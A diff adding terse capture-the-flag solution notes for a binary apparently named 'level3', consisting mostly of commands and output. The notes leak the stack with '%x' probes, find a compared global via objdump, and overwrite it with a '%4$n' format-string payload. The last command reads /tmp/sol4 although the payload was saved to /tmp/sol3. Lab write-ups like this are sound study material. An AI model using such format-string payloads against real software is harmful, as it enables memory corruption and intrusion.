@@ -1,0 +1,22 @@
+
+
+
+python -c "print('a' * 50 +  20 * ' %x')" > /tmp/sol3
+
+cat /tmp/sol3 - | ./level3
+    -> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 200 b7fd1ac0 b7ff37d0 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 25206161 78252078 20782520 25207825 78252078
+
+
+objdump -d -Mintel level3
+    ->  80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
+        80484df:       83 f8 40                cmp    eax,0x40
+
+0x40 = 64
+
+python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + 20 * ' %x')" > /tmp/sol3
+    -> ��aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 200 b7fd1ac0 b7ff37d0 804988c 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 2078252
+
+
+python -c "print('\x8c\x98\x04\x08' + 60 * 'a' + '%4\$n')" > /tmp/sol3
+
+cat /tmp/sol4 - | ./level3
